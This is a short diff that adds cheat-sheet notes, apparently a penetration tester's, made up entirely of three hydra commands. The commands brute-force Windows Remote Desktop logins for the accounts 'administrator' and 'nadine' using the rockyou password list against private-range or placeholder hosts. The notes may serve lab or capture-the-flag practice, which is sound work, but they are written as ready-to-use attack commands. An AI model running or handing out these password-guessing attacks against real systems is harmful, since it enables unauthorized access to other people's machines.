@@ -1,1 +1,11 @@
+RDP:
+hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.x.x
 
+RDP:
+Windows RDP
+Bruteforce Windows Remote Desktop credentials
+hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP
+
+RDP:
+Hydra RDP
+sudo hydra -f -l nadine -P /usr/share/wordlists/rockyou.txt -s 3389 rdp://192.168.x.x -v -t 4  
